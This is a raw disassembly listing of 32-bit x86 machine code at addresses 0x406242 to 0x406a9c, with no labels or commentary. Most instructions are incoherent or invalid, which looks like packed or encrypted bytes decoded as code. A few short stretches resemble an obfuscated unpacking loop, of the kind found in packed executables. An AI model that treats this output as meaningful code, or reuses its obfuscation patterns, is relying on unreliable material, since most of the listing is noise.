  406242:	sbb    DWORD PTR [edx+esi*1-0x71],edi
  406246:	add    esp,ebx
  406248:	psrld  mm4,QWORD PTR [edi-0x5c3507fb]
  40624f:	(bad)  
  406250:	retf   
  406251:	je     0x406284
  406253:	mov    edi,0xa9c6c81d
  406258:	fisttp WORD PTR [eax-0x13]
  40625b:	cmp    esp,DWORD PTR [esp+0x63]
  40625f:	sti    
  406260:	repz mov ebx,0x8ef5e2e7
  406266:	cmp    DWORD PTR [edi],0xc
  406269:	cmc    
  40626a:	add    bh,BYTE PTR [ebp+0x6d0b0def]
  406270:	dec    DWORD PTR ds:0x213e583a
  406276:	lahf   
  406277:	je     0x4062b2
  406279:	scas   eax,DWORD PTR es:[edi]
  40627a:	xchg   ebp,eax
  40627b:	dec    esp
  40627c:	(bad)
  406281:	adc    eax,0xf5a3c13d
  406286:	mov    esp,esi
  406288:	sbb    al,0xbb
  40628a:	push   esi
  40628b:	cli    
  40628c:	and    esp,DWORD PTR [eax+0x53de8d10]
  406292:	mov    eax,ss:0xded50d35
  406298:	test   eax,edx
  40629a:	test   eax,0x8380f739
  40629f:	int    0xf4
  4062a1:	in     eax,dx
  4062a2:	mov    cl,BYTE PTR [ecx+0x7]
  4062a5:	sbb    BYTE PTR [ebx],cl
  4062a7:	fcomp  st(3)
  4062a9:	pop    ds
  4062aa:	addr16 jge 0x406304
  4062ad:	cmp    DWORD PTR ds:0x289d17a0,0x70
  4062b4:	not    DWORD PTR cs:[eax-0x2b]
  4062b8:	xlat   BYTE PTR ds:[ebx]
  4062b9:	push   DWORD PTR [ebp+0x5ecd5bbf]
  4062bf:	sub    eax,0x995263bd
  4062c4:	fidiv  WORD PTR [ebx+0x2e3798bc]
  4062ca:	jl     0x406301
  4062cc:	jae    0x406258
  4062ce:	and    DWORD PTR [ecx],eax
  4062d0:	adc    dl,BYTE PTR [eax+0xcd2326b]
  4062d6:	mov    bh,0x3f
  4062d8:	xor    esp,DWORD PTR [ecx]
  4062da:	dec    ebx
  4062db:	mov    al,ds:0xa327ff7e
  4062e0:	das    
  4062e1:	cmp    BYTE PTR [edx-0x25b7ec88],bh
  4062e7:	shl    BYTE PTR [eax-0x640cf98],0x6d
  4062ee:	inc    esp
  4062ef:	mov    ch,0xa6
  4062f1:	mov    eax,0xaa561cbd
  4062f6:	aam    0x87
  4062f8:	adc    dh,ch
  4062fa:	jmp    0x409a4aa6
  4062ff:	adc    ah,BYTE PTR [esi-0x714017e2]
  406305:	sbb    al,0x3c
  406307:	xchg   dh,ah
  406309:	int    0x14
  40630b:	les    esp,FWORD PTR [esi-0x44]
  40630e:	je     0x40632c
  406310:	add    BYTE PTR [esi],ch
  406312:	dec    esi
  406313:	mov    dl,0x21
  406315:	adc    dh,BYTE PTR [ecx-0x1b]
  406318:	cmc    
  406319:	or     eax,DWORD PTR [ecx+0x31]
  40631c:	rcl    DWORD PTR [eax-0x1e],0xe4
  406320:	jbe    0x4062dd
  406322:	mov    ecx,?
  406324:	loope  0x406386
  406326:	xor    DWORD PTR [bx+si+0x5000],edx
  40632b:	sbb    ah,BYTE PTR [ecx+0x10]
  40632e:	bound  ebp,QWORD PTR [eax-0x62]
  406331:	mul    BYTE PTR [esi-0x741b6a67]
  406337:	ins    BYTE PTR es:[edi],dx
  406338:	jb     0x4062e9
  40633a:	loopne 0x406370
  40633c:	cmc    
  40633d:	neg    BYTE PTR [ebx-0x4b62d63]
  406343:	mov    cl,0xe0
  406345:	vmwrite ecx,DWORD PTR gs:[ecx+0x2]
  40634a:	jmp    0x1de4:0x81fbc858
  406351:	xor    al,0x65
  406353:	in     eax,dx
  406354:	push   ebx
  406355:	pop    edi
  406356:	push   esi
  406357:	add    esp,DWORD PTR [edi-0x5886bc64]
  40635d:	int3   
  40635e:	add    DWORD PTR [ebp+edx*1-0x5a],edx
  406362:	sub    BYTE PTR [ebx+0x21],al
  406365:	sbb    edx,eax
  406367:	mov    eax,0xc38f27d8
  40636c:	sbb    al,0x27
  40636e:	jmp    0x1349:0x8976ff69
  406375:	in     eax,0x8f
  406377:	popa   
  406378:	jle    0x4063e9
  40637a:	stc    
  40637b:	inc    edi
  40637c:	leave  
  40637d:	mov    eax,ds
  40637f:	cmp    DWORD PTR [ebx+ebp*1],esi
  406382:	mov    edx,0x34a13cd5
  406387:	jo     0x4063cf
  406389:	out    0xbc,eax
  40638b:	lock adc ch,bl
  40638e:	mov    al,ds:0xe656f775
  406393:	pop    ss
  406394:	int3   
  406395:	adc    eax,0x33660e0e
  40639a:	(bad)  
  40639b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40639c:	(bad)  
  40639d:	push   esp
  40639e:	push   0xffffff9a
  4063a0:	adc    dh,BYTE PTR [edi+0x42]
  4063a3:	pop    es
  4063a4:	xor    DWORD PTR [edi+edi*4+0x3d],ebx
  4063a8:	mov    esi,0x9cf1c581
  4063ad:	lea    edx,[esi]
  4063af:	or     eax,0x37d2d136
  4063b4:	dec    edi
  4063b5:	mov    edi,?
  4063b7:	sbb    edi,edi
  4063b9:	mov    ecx,DWORD PTR [ebx-0x328ba39b]
  4063bf:	mov    esp,0xa225efaa
  4063c4:	daa    
  4063c5:	dec    ebp
  4063c6:	fild   QWORD PTR [eax-0x6]
  4063c9:	loop   0x40639b
  4063cb:	mov    ecx,0x8095d0e4
  4063d0:	mov    ds:0x9f3d326d,al
  4063d5:	hlt    
  4063d6:	jecxz  0x406389
  4063d8:	xchg   edi,eax
  4063d9:	and    edi,ebp
  4063db:	cwde   
  4063dc:	fidiv  WORD PTR [edx+0x39679d7d]
  4063e2:	ss ret 
  4063e4:	loope  0x406435
  4063e6:	jne    0x4063c5
  4063e8:	xor    bh,bl
  4063ea:	daa    
  4063eb:	(bad)  
  4063ed:	push   ss
  4063ee:	adc    al,0xc9
  4063f0:	mov    ebp,esi
  4063f2:	xor    edx,esi
  4063f4:	inc    esp
  4063f5:	ds push 0xffffffab
  4063f8:	clc    
  4063f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063fa:	and    DWORD PTR [ebp+0x44f384bb],0x6a737296
  406404:	add    ebx,DWORD PTR [ebp+ecx*1+0x28]
  406408:	jg     0x406398
  40640a:	fisttp DWORD PTR [eax+0x18]
  40640d:	enter  0x497c,0xdd
  406411:	imul   esi,edx,0xffffffaa
  406414:	xchg   ecx,eax
  406415:	aam    0x48
  406417:	(bad)  
  406419:	jne    0x4063e3
  40641b:	xchg   esi,eax
  40641c:	outs   dx,DWORD PTR ds:[esi]
  40641d:	(bad)  ds:0x48797045
  406423:	aas    
  406424:	dec    eax
  406425:	sahf   
  406426:	stos   DWORD PTR es:[edi],eax
  406427:	mov    bl,BYTE PTR [eax]
  406429:	mov    bl,0x68
  40642b:	pop    esp
  40642c:	sbb    ebx,DWORD PTR [ebx-0x6e5e064a]
  406432:	jno    0x40642b
  406434:	or     ebx,0x2918dad9
  40643a:	mov    eax,ds:0xef04fdd4
  40643f:	(bad)  
  406440:	add    BYTE PTR es:[esi],dh
  406443:	jo     0x40640f
  406445:	dec    esi
  406446:	lds    edx,FWORD PTR [ebp-0x7b]
  406449:	(bad)  
  40644a:	and    DWORD PTR [ebx+0x4956a062],ebx
  406450:	in     al,0x94
  406452:	ficomp DWORD PTR [esi+0x39]
  406455:	cwde   
  406456:	retf   0xea2a
  406459:	cmp    al,0xa8
  40645b:	mov    esi,0x598f72c1
  406460:	test   BYTE PTR [edx*8+0x72eddd7c],0x7a
  406468:	push   cs
  406469:	lahf   
  40646a:	jmp    0x406426
  40646c:	mov    eax,ds:0xcbadb4d4
  406471:	sub    BYTE PTR [esi+0x2cde6563],al
  406477:	xor    al,0x8c
  406479:	mov    edx,0x685e8afb
  40647e:	and    eax,0x9732576a
  406483:	mov    bh,0xf2
  406485:	and    bp,WORD PTR [edi]
  406488:	mov    edx,0x64b088b7
  40648d:	push   DWORD PTR [edi+0x1b]
  406490:	pop    edx
  406491:	jp     0x406454
  406493:	sahf   
  406494:	inc    edi
  406495:	out    dx,al
  406496:	pop    edx
  406497:	jmp    0x163e22c7
  40649c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40649d:	jnp    0x40646f
  40649f:	ficom  WORD PTR [edi]
  4064a1:	mov    edi,0xb8db9200
  4064a6:	push   esi
  4064a7:	fs jae 0x4064cc
  4064aa:	out    0x46,eax
  4064ac:	push   ss
  4064ad:	imul   ecx,DWORD PTR [ebx-0x6216fb09],0xffffffec
  4064b4:	aas    
  4064b5:	sbb    BYTE PTR [esp+ebx*1+0x983c58a],bl
  4064bc:	aas    
  4064bd:	aaa    
  4064be:	xor    eax,0x221a0978
  4064c3:	sbb    cl,BYTE PTR [ebp+0x27]
  4064c6:	stos   BYTE PTR es:[edi],al
  4064c7:	mov    es,WORD PTR [ecx]
  4064c9:	das    
  4064ca:	cli    
  4064cb:	call   0x1b20:0x6b798a96
  4064d2:	shr    DWORD PTR [edi],cl
  4064d4:	mov    dh,0x4a
  4064d6:	pop    ss
  4064d7:	dec    ecx
  4064d8:	sbb    esi,DWORD PTR [ecx+0x3e]
  4064db:	add    al,0xdb
  4064dd:	xor    BYTE PTR [ebx],0x4e
  4064e0:	mov    ebx,0x3503e0f8
  4064e5:	pop    ss
  4064e6:	out    0x41,al
  4064e8:	(bad)  
  4064e9:	mov    eax,ds:0xf60c6ca
  4064ee:	ins    BYTE PTR es:[edi],dx
  4064ef:	and    cl,dl
  4064f1:	or     DWORD PTR [edx+0x24c8187e],esp
  4064f7:	or     ch,ch
  4064f9:	cwde   
  4064fa:	sub    BYTE PTR ds:0x822a48e4,bh
  406500:	or     BYTE PTR [ecx-0x5d],bh
  406503:	(bad)  
  406504:	mov    es,WORD PTR [edx+0x408b6991]
  40650a:	dec    edi
  40650b:	and    edi,DWORD PTR [edi-0x4d]
  40650e:	cld    
  40650f:	and    eax,0x5b9fe9fd
  406514:	adc    BYTE PTR [ecx-0xd],dl
  406517:	out    0x62,al
  406519:	lods   al,BYTE PTR ds:[esi]
  40651a:	mov    ds:0x668314bf,eax
  40651f:	jp     0x406588
  406521:	cmp    ecx,edi
  406523:	pop    ebx
  406524:	cwde   
  406525:	ja     0x4064b9
  406527:	leave  
  406528:	mov    esp,0x456a0b59
  40652d:	jle    0x40658e
  40652f:	loop   0x406599
  406531:	jg     0x406502
  406533:	lods   al,BYTE PTR ds:[esi]
  406534:	es jge 0x40655b
  406537:	push   ecx
  406539:	or     eax,0x1e8c3902
  40653e:	out    0x84,al
  406540:	mov    ebx,?
  406542:	push   cs
  406543:	dec    ebx
  406544:	jae    0x4065ba
  406546:	outs   dx,DWORD PTR ds:[esi]
  406547:	sub    DWORD PTR [esi-0x4d996170],0x466ce711
  406551:	shl    DWORD PTR ds:0x2d844831,1
  406557:	aad    0x86
  406559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40655a:	sub    al,BYTE PTR [ebx]
  40655c:	out    0x98,al
  40655e:	ret    0x8c0a
  406561:	jle    0x406579
  406563:	ret    
  406564:	xchg   esp,eax
  406565:	cmp    BYTE PTR [edx],bl
  406567:	in     eax,dx
  406568:	test   ebx,ebp
  40656a:	ins    DWORD PTR es:[edi],dx
  40656b:	retf   0xa26d
  40656e:	int    0x9d
  406570:	icebp  
  406571:	stos   BYTE PTR es:[edi],al
  406572:	fdivr  DWORD PTR [ebx-0x48]
  406575:	ss addr16 mov cl,0x86
  406579:	fdivr  DWORD PTR [ebx+ecx*1-0x5e]
  40657d:	inc    edx
  40657e:	lea    edx,[eax]
  406580:	push   esi
  406581:	jp     0x406551
  406583:	and    al,BYTE PTR [edx+0x20663cf0]
  406589:	daa    
  40658a:	pusha  
  40658b:	adc    al,0x6e
  40658d:	add    al,0xfd
  40658f:	sti    
  406590:	in     al,0x83
  406592:	cmp    al,BYTE PTR [ecx]
  406594:	sti    
  406595:	repnz stos DWORD PTR es:[edi],eax
  406597:	jne    0x406534
  406599:	cmp    ecx,eax
  40659b:	inc    esi
  40659c:	clc    
  40659d:	into   
  40659e:	out    0xa3,al
  4065a0:	cmp    al,0x62
  4065a2:	lea    eax,[ebp-0x24]
  4065a5:	movzx  ecx,WORD PTR ds:0x43473b
  4065ac:	and    ecx,DWORD PTR ds:0x434673
  4065b2:	mov    DWORD PTR ds:0x43473b,ecx
  4065b8:	mov    DWORD PTR [ebp-0x28],eax
  4065bb:	adc    DWORD PTR ds:0x43467f,ecx
  4065c1:	mov    eax,DWORD PTR [ebp+0x8]
  4065c4:	sbb    ecx,DWORD PTR ds:0x43478f
  4065ca:	mov    DWORD PTR [ebp-0x20],eax
  4065cd:	push   ebx
  4065ce:	sub    DWORD PTR ds:0x434677,ebx
  4065d4:	lea    eax,[ebp-0x18]
  4065d7:	mov    DWORD PTR [ebp-0x1c],eax
  4065da:	xor    DWORD PTR ds:0x4346cf,edx
  4065e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4065e3:	and    DWORD PTR ds:0x43466b,0x0
  4065ed:	mov    ecx,DWORD PTR ds:0x43466b
  4065f3:	inc    ecx
  4065f4:	mov    DWORD PTR ds:0x43466b,ecx
  4065fa:	cmp    DWORD PTR ds:0x43466b,0x1e
  406601:	jne    0x40661a
  406607:	push   DWORD PTR [ebp-0x14]
  40660a:	push   0x4346c7
  40660f:	push   0x43499f
  406614:	call   DWORD PTR ds:0x413400
  40661a:	cmp    DWORD PTR ds:0x43466b,0x1c
  406621:	jb     0x4065ed
  406627:	jmp    0x406a15
  40662c:	call   0x70d95cef
  406631:	mov    al,0x70
  406633:	dec    esi
  406634:	mov    BYTE PTR [ecx],dh
  406636:	push   esi
  406637:	inc    esp
  406638:	pop    ecx
  406639:	int    0x77
  40663b:	mov    eax,ds:0x7e7e3b4c
  406640:	dec    edi
  406641:	jns    0x4066c1
  406643:	jle    0x4066b7
  406645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406646:	mov    ds:0x3ed1f69d,eax
  40664b:	add    edx,edx
  40664d:	push   ebx
  40664e:	xchg   esp,eax
  40664f:	mov    ch,0x34
  406651:	lods   eax,DWORD PTR ds:[esi]
  406652:	adc    al,0xb0
  406654:	adc    eax,ebx
  406656:	mov    dl,0xc7
  406658:	in     al,dx
  406659:	xchg   ecx,ebx
  40665b:	in     al,0xc3
  40665d:	repnz mov ds:0x324c6ae9,eax
  406663:	call   0x6052d107
  406668:	pop    esp
  406669:	and    bl,BYTE PTR [esi+0x62]
  40666c:	mov    fs,WORD PTR [edi+ebx*4]
  40666f:	(bad)  [edi]
  406671:	mov    edi,DWORD PTR [edx+0x4d]
  406674:	aam    0x84
  406676:	outs   dx,BYTE PTR ds:[esi]
  406677:	dec    esp
  406678:	mov    esi,0x5a0afc71
  40667d:	add    al,0xde
  40667f:	mov    WORD PTR [eax-0x12f11161],?
  406685:	dec    ebp
  406686:	mov    esi,0x3aec27a1
  40668b:	sub    BYTE PTR [ebx],0x97
  40668e:	mov    DWORD PTR [ebx-0x21ace227],esp
  406694:	mov    esp,0x80ec1d90
  406699:	cmp    al,0x73
  40669b:	aad    0xe
  40669d:	or     al,0x55
  40669f:	add    al,0x23
  4066a1:	add    edx,DWORD PTR [edx-0x4795b57d]
  4066a7:	push   0x1b
  4066a9:	sbb    bh,ah
  4066ab:	push   ss
  4066ac:	mov    ebp,0xa94175dd
  4066b1:	out    0x78,al
  4066b3:	mov    cl,0x87
  4066b5:	mul    DWORD PTR [esi]
  4066b7:	or     eax,0x65c5b28
  4066bc:	bound  edx,QWORD PTR [eax+0x60ca8e66]
  4066c2:	adc    DWORD PTR [ecx+0x2],0xffffffcd
  4066c6:	ins    BYTE PTR es:[edi],dx
  4066c7:	pop    edx
  4066c9:	mov    eax,ds:0x1e402982
  4066ce:	cmp    eax,0xa8428cb2
  4066d3:	jae    0x406718
  4066d5:	bound  ebp,QWORD PTR [ecx]
  4066d7:	frstor [edi+0x15]
  4066da:	enter  0x8d93,0xf8
  4066de:	das    
  4066df:	arpl   bx,ax
  4066e1:	and    ah,BYTE PTR [edx+esi*2-0x47117d1b]
  4066e8:	adc    dl,cl
  4066ea:	cmp    DWORD PTR [esi+0x7a],0x57a29a03
  4066f1:	dec    ecx
  4066f2:	bound  esp,QWORD PTR [edi+0x57]
  4066f5:	fdiv   QWORD PTR [eax]
  4066f7:	stos   BYTE PTR es:[edi],al
  4066f8:	fs popf 
  4066fa:	repz ret 
  4066fc:	sti    
  4066fd:	pop    edi
  4066fe:	stos   DWORD PTR es:[edi],eax
  4066ff:	fcom   QWORD PTR [esi]
  406701:	xchg   ebp,eax
  406702:	jno    0x406767
  406704:	into   
  406705:	xor    DWORD PTR [edi],ebp
  406707:	pop    ecx
  406708:	test   edx,esi
  40670a:	xchg   edx,eax
  40670b:	pop    ss
  40670c:	test   DWORD PTR ds:[esi+0x70],esi
  406710:	jl     0x4066f1
  406712:	ror    BYTE PTR [edx+0x5c],cl
  406715:	mov    ds:0x3391585,eax
  40671a:	repz dec eax
  40671c:	std    
  40671d:	dec    esi
  40671e:	stos   DWORD PTR es:[edi],eax
  40671f:	sahf   
  406720:	and    al,0x5b
  406722:	xchg   edi,eax
  406723:	xor    DWORD PTR [edx+0x4d80ab80],0x7280c25
  40672d:	mov    edx,0xf0ad0b3f
  406732:	lahf   
  406733:	mov    dl,0xfa
  406735:	out    dx,eax
  406736:	ret    
  406737:	fld    TBYTE PTR ds:0x60176ba6
  40673d:	push   esp
  40673e:	imul   eax,DWORD PTR [edx-0xd],0x11feeb7a
  406745:	stc    
  406746:	ins    DWORD PTR es:[edi],dx
  406747:	ins    BYTE PTR es:[edi],dx
  406748:	xchg   BYTE PTR [edi-0x29],al
  40674b:	les    esp,FWORD PTR [edi+0x5]
  40674e:	mov    fs,WORD PTR [edx-0x63]
  406751:	cmp    dh,bl
  406753:	out    0xef,al
  406755:	adc    eax,0x74f1a6ec
  40675a:	jnp    0x406791
  40675c:	nop
  40675d:	sub    DWORD PTR [esi],esi
  40675f:	or     bh,BYTE PTR [ebp-0x55]
  406762:	add    DWORD PTR [esp+eiz*2+0x37],esi
  406766:	jg     0x40670f
  406768:	bound  edi,QWORD PTR [ebx]
  40676a:	adc    al,0x8e
  40676c:	nop
  40676d:	fcomp  QWORD PTR [edx-0x9995bdc]
  406773:	adc    al,0xaf
  406775:	icebp  
  406776:	mov    eax,ds:0x93e2e2eb
  40677b:	or     eax,0x153faa7c
  406780:	mov    ebp,0x8009655e
  406785:	adc    DWORD PTR [ebx],ecx
  406787:	out    dx,al
  406788:	ret    0xc51c
  40678b:	inc    esp
  40678c:	push   ss
  40678d:	pop    eax
  40678e:	nop
  40678f:	aad    0xa2
  406791:	aaa    
  406792:	fbstp  TBYTE PTR [edi+edx*2+0x3c]
  406796:	push   ecx
  406797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406798:	das    
  406799:	std    
  40679a:	(bad)  
  40679b:	aam    0x84
  40679d:	retf   0xb33d
  4067a0:	add    DWORD PTR [ecx+0x72],eax
  4067a3:	gs inc ebp
  4067a5:	jmp    0x98316d78
  4067aa:	jle    0x406747
  4067ac:	sub    ebp,edi
  4067ae:	sbb    eax,DWORD PTR [eax]
  4067b0:	imul   esp,DWORD PTR [edx],0x39
  4067b3:	in     eax,0xd3
  4067b5:	inc    edx
  4067b6:	mov    cl,0x55
  4067b8:	or     eax,0x34cc0350
  4067bd:	push   ds
  4067be:	fsubr  st,st(2)
  4067c0:	mov    esi,ebp
  4067c2:	adc    BYTE PTR [edx-0x480a8e91],ch
  4067c8:	mov    ebx,0x5aae0452
  4067cd:	mov    cl,0x60
  4067cf:	push   edx
  4067d0:	int    0xf9
  4067d2:	adc    BYTE PTR [ebx-0x20],cl
  4067d5:	dec    eax
  4067d6:	das    
  4067d7:	es inc esi
  4067d9:	sub    DWORD PTR [edi-0x5275032],ebx
  4067df:	std    
  4067e0:	fiadd  WORD PTR [edi+0x53]
  4067e3:	icebp  
  4067e4:	adc    cl,BYTE PTR [ebx-0x4c]
  4067e7:	fldenv [edx]
  4067e9:	add    esi,eax
  4067eb:	mov    WORD PTR [ebx-0x56],?
  4067ee:	jae    0x406781
  4067f0:	mov    DWORD PTR [eax],esi
  4067f2:	pop    ebx
  4067f3:	and    al,0xc7
  4067f5:	fwait
  4067f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067f7:	or     eax,0xedfdd1df
  4067fc:	ret    
  4067fd:	imul   edx,DWORD PTR [ebp-0x79cf25a3],0xffffff99
  406804:	and    edi,ecx
  406806:	jmp    0xc724:0x5d0429f4
  40680d:	jl     0x40686b
  40680f:	push   ebp
  406810:	test   DWORD PTR [di-0x64],eax
  406814:	ja     0x4067d4
  406816:	adc    esi,DWORD PTR [edi+0x46]
  406819:	mov    esp,0x4be97c0c
  40681e:	stc    
  40681f:	inc    BYTE PTR [edx+0x5db7b6dd]
  406825:	loop   0x4067d0
  406827:	sub    al,0x3a
  406829:	es fs (bad) 
  40682c:	pop    ss
  40682d:	mov    esi,0x7226ff46
  406832:	push   ss
  406833:	cmp    dl,dl
  406835:	(bad)  
  406836:	or     bl,BYTE PTR ss:[edi-0x41]
  40683a:	mov    ebx,0x77893481
  40683f:	dec    esi
  406840:	push   cs
  406841:	xor    eax,0x57c0b32e
  406846:	call   0xab8c:0x1ee0ee58
  40684d:	or     eax,0x6a052b7b
  406852:	aaa    
  406853:	popf   
  406854:	loop   0x4067ff
  406856:	jns    0x406828
  406858:	es test al,0xf1
  40685b:	loop   0x40684b
  40685d:	ret    
  40685e:	cmp    edi,ecx
  406860:	retf   0x24b6
  406863:	or     al,0x6a
  406865:	imul   esp,DWORD PTR [ecx+0xf],0xa645f077
  40686c:	cli    
  40686d:	inc    ebp
  40686e:	push   ebp
  40686f:	stc    
  406870:	jmp    0x95db:0x5c3acd1c
  406877:	pop    ebp
  406878:	ret    
  406879:	sahf   
  40687a:	xor    eax,0x26c5ce0f
  40687f:	xlat   BYTE PTR ds:[ebx]
  406880:	std    
  406881:	(bad)  
  406882:	xor    eax,0xa482a25b
  406887:	mov    ch,0x19
  406889:	or     DWORD PTR [ecx-0x4],ebx
  40688c:	dec    esp
  40688d:	pop    ebp
  40688e:	inc    ecx
  40688f:	stos   BYTE PTR es:[edi],al
  406890:	jmp    0xc06f1948
  406895:	inc    edi
  406896:	mov    ds:0xb2bda84a,eax
  40689b:	scas   eax,DWORD PTR es:[edi]
  40689c:	shl    DWORD PTR [edi],0xe1
  40689f:	xlat   BYTE PTR ds:[ebx]
  4068a0:	pop    ss
  4068a1:	das    
  4068a2:	sbb    BYTE PTR [esp+ecx*4+0x36c7d426],bh
  4068a9:	fs jg  0x40687a
  4068ac:	cmp    DWORD PTR [ecx],0x7b
  4068af:	jge    0x4068c0
  4068b1:	ins    DWORD PTR es:[edi],dx
  4068b2:	mov    bh,BYTE PTR [edx+0x6fa11e71]
  4068b8:	pop    es
  4068b9:	jbe    0x406886
  4068bb:	hlt    
  4068bc:	xor    DWORD PTR [ecx-0x3052a931],eax
  4068c2:	repnz push ecx
  4068c4:	xchg   BYTE PTR [ecx],bh
  4068c6:	dec    esp
  4068c7:	add    ch,BYTE PTR [bx+di+0x7c]
  4068cb:	dec    edx
  4068cc:	jns    0x4068f4
  4068ce:	js     0x4068ee
  4068d0:	js     0x4068ef
  4068d2:	call   0xfc01:0x4e8cfb3a
  4068d9:	cs push ss
  4068db:	clc    
  4068dc:	fist   WORD PTR [eax+ebp*4-0x3769c34b]
  4068e3:	inc    ecx
  4068e4:	add    BYTE PTR [ebx+0x1a630167],ch
  4068ea:	sbb    esi,DWORD PTR [edi-0x26]
  4068ed:	mov    cl,0x51
  4068ef:	imul   dh
  4068f1:	int    0x2a
  4068f3:	test   edi,0xf3e4b3c3
  4068f9:	loopne 0x4068a5
  4068fb:	or     DWORD PTR [ebx-0x5790f42a],esi
  406901:	cmp    al,0xd3
  406903:	(bad)  
  406904:	cmp    DWORD PTR [edi+0x4b2e2964],esp
  40690a:	xchg   edi,eax
  40690b:	adc    eax,0x1e0fe851
  406910:	jbe    0x40689e
  406912:	pushf  
  406913:	out    0x1c,eax
  406915:	sbb    al,0xc3
  406917:	lods   al,BYTE PTR ds:[esi]
  406918:	cmp    eax,esi
  40691a:	jb     0x406901
  40691c:	gs fwait
  40691e:	dec    ecx
  40691f:	and    esi,esp
  406921:	jle    0x406918
  406923:	mov    BYTE PTR [eax+0x65],dh
  406926:	sub    eax,0x603f6237
  40692b:	and    al,0xf3
  40692d:	mov    ss,WORD PTR [ebp+eiz*4-0x56]
  406931:	in     al,dx
  406932:	ja     0x40691a
  406934:	xchg   edx,eax
  406935:	xchg   DWORD PTR [edi-0x10],esi
  406938:	iret   
  406939:	xor    BYTE PTR ds:0x85f74964,dh
  40693f:	push   edi
  406940:	std    
  406941:	and    dh,BYTE PTR [edx]
  406943:	jmp    0xd72c96b5
  406948:	or     BYTE PTR [edx],bl
  40694a:	jecxz  0x4069be
  40694c:	sbb    eax,0xd460103e
  406951:	push   es
  406952:	mov    esp,0xc7d600d6
  406957:	xor    BYTE PTR [ebx+0x610697c4],0xa3
  40695e:	mov    dh,0x1f
  406960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406961:	mul    BYTE PTR [ebx+0x6ddb5b6c]
  406967:	xchg   ebp,eax
  406968:	push   0xffffff85
  40696a:	cmp    BYTE PTR [edx],al
  40696c:	sar    DWORD PTR [edi],1
  40696e:	stc    
  40696f:	(bad)  
  406971:	jecxz  0x40695e
  406973:	stos   DWORD PTR es:[edi],eax
  406974:	mov    cl,0x44
  406976:	sub    eax,0x5fcee164
  40697b:	mov    ch,0xfc
  40697d:	bsf    edx,DWORD PTR [ebx]
  406980:	(bad)  
  406981:	cmp    eax,0x7eab374f
  406986:	out    0xdd,eax
  406988:	js     0x4069f0
  40698a:	push   ebp
  40698b:	cmc    
  40698c:	shl    BYTE PTR [edi-0xf],1
  40698f:	imul   eax,DWORD PTR [ebx-0x1cacb944],0xffffffdb
  406996:	inc    edi
  406997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406998:	push   0x50e9c444
  40699d:	retf   
  40699e:	inc    edi
  40699f:	mov    al,al
  4069a1:	(bad)  
  4069a2:	fild   DWORD PTR [edx-0x7c]
  4069a5:	add    eax,0xa1112ab0
  4069aa:	aad    0xba
  4069ac:	(bad)  
  4069ae:	scas   al,BYTE PTR es:[edi]
  4069af:	or     dl,cl
  4069b1:	jne    0x4069f2
  4069b3:	push   ecx
  4069b4:	push   es
  4069b5:	cmp    eax,0x4fc1c60e
  4069ba:	loopne 0x406a24
  4069bc:	dec    ecx
  4069bd:	repz test ebx,0xe3b9ac4d
  4069c4:	and    bh,cl
  4069c6:	dec    esp
  4069c7:	in     al,dx
  4069c8:	das    
  4069c9:	bnd call 0x3a51fc15
  4069cf:	int3   
  4069d0:	les    ebp,FWORD PTR [ebp-0x48]
  4069d3:	data16 icebp 
  4069d5:	and    eax,0x1d719542
  4069da:	stos   DWORD PTR es:[edi],eax
  4069db:	fwait
  4069dc:	stos   BYTE PTR es:[edi],al
  4069dd:	and    ebx,DWORD PTR [ebp-0x3b769275]
  4069e3:	jp     0x4069dc
  4069e5:	out    dx,al
  4069e6:	add    DWORD PTR ds:0xa605e038,ecx
  4069ec:	stos   DWORD PTR es:[edi],eax
  4069ed:	pop    esp
  4069ee:	xlat   BYTE PTR ds:[ebx]
  4069ef:	ins    BYTE PTR es:[edi],dx
  4069f0:	mov    al,ds:0x4d8e4b49
  4069f5:	stos   DWORD PTR es:[edi],eax
  4069f6:	in     eax,0x87
  4069f8:	and    eax,0x2ebbf460
  4069fd:	fs std 
  4069ff:	jo     0x4069f0
  406a01:	repz daa 
  406a03:	sti    
  406a04:	scas   eax,DWORD PTR es:[edi]
  406a05:	fwait
  406a06:	daa    
  406a07:	mov    bh,0x20
  406a09:	ins    DWORD PTR es:[edi],dx
  406a0a:	mov    WORD PTR [ecx+0x3b0ebb5d],gs
  406a10:	lds    ebx,FWORD PTR [ebx+0x6f]
  406a13:	push   ds
  406a14:	push   esi
  406a15:	push   esi
  406a16:	push   edi
  406a17:	xor    edi,ecx
  406a19:	mov    edi,0xf89f2dae
  406a1e:	mov    DWORD PTR [eax],edi
  406a20:	mov    eax,DWORD PTR [ebp-0x14]
  406a23:	mov    ebx,DWORD PTR [ebp-0x8]
  406a26:	xor    DWORD PTR ds:0x434703,ebx
  406a2c:	mov    ecx,0x7510851
  406a31:	xor    eax,ecx
  406a33:	sbb    esi,DWORD PTR ds:0x43467b
  406a39:	mov    esi,0x327299
  406a3e:	xor    ebx,ecx
  406a40:	add    DWORD PTR ds:0x4346bb,0x434777
  406a4a:	xor    edx,edx
  406a4c:	add    eax,esi
  406a4e:	sbb    DWORD PTR ds:0x43465f,0x1c54
  406a58:	add    ebx,esi
  406a5a:	div    ebx
  406a5c:	mov    DWORD PTR ds:0x4346b7,edi
  406a62:	jmp    0x406e50
  406a67:	inc    ebx
  406a68:	push   ebp
  406a69:	sti    
  406a6a:	sbb    DWORD PTR [ebp-0x49aabca3],0xffffff8a
  406a71:	mov    ds:0x651c8feb,eax
  406a76:	jno    0x406a15
  406a78:	(bad)  
  406a79:	jle    0x406af9
  406a7b:	dec    edi
  406a7c:	jns    0x406afc
  406a7e:	jle    0x406ac9
  406a80:	jle    0x406a78
  406a82:	daa    
  406a83:	or     ecx,eax
  406a85:	sub    al,0xb1
  406a87:	and    DWORD PTR [edx+0x1c],0x56
  406a8b:	dec    DWORD PTR [edi+ecx*4+0x5253dfde]
  406a92:	dec    edi
  406a93:	pop    edx
  406a94:	stc    
  406a95:	rcl    DWORD PTR [eax+0x16dc446],0x5a
  406a9c:	daa    
